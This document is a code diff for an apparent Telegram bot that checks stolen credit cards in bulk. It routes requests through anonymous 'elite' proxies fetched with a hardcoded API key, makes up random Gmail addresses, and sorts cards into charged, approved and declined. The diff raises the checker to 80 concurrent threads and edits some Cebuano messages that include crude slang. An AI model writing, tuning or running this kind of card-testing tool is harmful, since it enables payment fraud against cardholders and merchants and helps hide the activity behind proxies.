@@ -43,17 +43,17 @@ USER_AGENTS = [
 
 def fetch_good_proxies(chat_id):
     global proxies_list
-    bot.send_message(chat_id, "🔄 Nag-download og bag-ong elite proxies (Very Fast)...")
+    bot.send_message(chat_id, "🔄 Nag-download og bag-ong lijo proxies (iyot iyot)...")
     try:
         url = "https://api.good-proxies.ru/api"
-        params = {'key': "3269305ce8094af10e5933fe67db8529", 'ping': "3000", 'time': "300", 'anon': "elite", 'access': "supportsHttps"}
+        params = {'key': "3269305ce8094af10e5933fe67db8529", 'ping': "5000", 'time': "300", 'anon': "elite", 'access': "supportsHttps"}
         headers = {'User-Agent': "okhttp/4.10.0"}
         response = requests.get(url, params=params, headers=headers, timeout=15)
         if response.status_code == 200:
             new_proxies = [line.strip() for line in response.text.splitlines() if line.strip() and ':' in line]
             if new_proxies:
                 proxies_list = new_proxies
-                bot.send_message(chat_id, f"✅ **VERY FAST** - Nakarga {len(proxies_list)} elite proxies!")
+                bot.send_message(chat_id, f"✅ **kasing kasing** - Nakarga {len(proxies_list)} elite proxies!")
                 return True
     except:
         pass
@@ -88,7 +88,7 @@ def format_proxy(p, p_type="http"):
 
 def generate_random_email():
     digits = ''.join(random.choices(string.digits, k=8))
-    return f"Xoarch{digits}@gmail.com"
+    return f"Haste{digits}@gmail.com"
 
 def _rand_id(k=32):
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))
@@ -377,7 +377,7 @@ def start(msg):
     markup.row('🔹 SINGLE CHECK', '🔹 MASS CHECK')
     markup.row('📊 STATUS', '📋 APPROVED LIST')
     markup.row('❌ STOP')
-    bot.send_message(msg.chat.id, "🟢 **HERMAN BISAK0L CHECKER** Andam na\n**Option 6 = PASAS KAAYO KAAYO Proxies**", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(msg.chat.id, "🟢 **HERMAN BISAK0L CHECKER** Andam na\n**Option 6 = PASAS KAAYO KAAYO PIPO**", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['approved'])
 def send_approved_list(msg):
@@ -456,7 +456,7 @@ def start_mass_check(ccs, use_proxy, proxy_type, chat_id):
     stats.update({"charged":0,"approved":0,"declined":0,"error":0})
     bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **VERY VERY FAST MODE (50 Threads)**")
     worker_args = partial(worker, use_proxy=use_proxy, proxy_type=proxy_type, chat_id=chat_id)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as ex:
         ex.map(worker_args, ccs)
     clean_declined_files()
     bot.send_message(chat_id, f"""✅ **Human na ang Check!**
